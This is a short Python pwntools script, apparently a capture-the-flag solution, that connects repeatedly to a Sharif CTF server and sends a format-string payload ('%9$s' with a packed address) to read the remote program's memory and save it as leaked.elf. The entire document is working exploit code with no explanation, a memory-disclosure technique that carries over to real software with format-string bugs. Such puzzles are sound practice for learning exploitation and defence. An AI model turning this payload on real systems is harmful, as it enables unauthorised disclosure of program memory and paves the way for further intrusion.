from pwn import *

i = 0
BASE = 0x400000

while True:

    r = remote("ctf.sharif.edu", 54514)

    log.info("leaking %#x", BASE + i)

    a = "%9$sPIZA" + p64(BASE + i)

    r.sendline(a)

    data = r.recv(0x4000, timeout=10)
    if "PIZA" in data:
        data = data.split("PIZA")[0]

    if len(data) == 0:
        data = "\x00"

    with open('leaked.elf', 'a') as f:
        f.write(data)

    i += len(data)

    if (i % 256) == 0xa:
        with open('leaked.elf', 'a') as f:
            f.write("\x00")
        i += 1

    r.close()
